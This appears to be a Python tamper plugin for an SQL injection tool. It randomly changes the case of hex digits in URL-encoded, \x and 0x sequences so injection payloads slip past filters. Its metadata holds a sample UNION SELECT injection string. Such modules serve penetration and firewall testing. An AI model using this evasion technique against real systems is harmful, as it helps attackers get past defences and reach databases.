import random
import re

__example_payload__ = "' UNION SELECT 0x61646d696e--"
__type__ = "randomize hex digit case inside %XX / \\x / 0x sequences"
__category__ = "encoding"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

_HEX_SEQ = re.compile(r"%[0-9A-Fa-f]{2}|\\x[0-9A-Fa-f]{2}|0x[0-9A-Fa-f]+")


def tamper(payload, **kwargs):
    if not payload:
        return payload

    def _swap(match):
        return "".join(
            random.choice((char.upper(), char.lower()))
            for char in match.group(0)
        )

    return _HEX_SEQ.sub(_swap, str(payload))
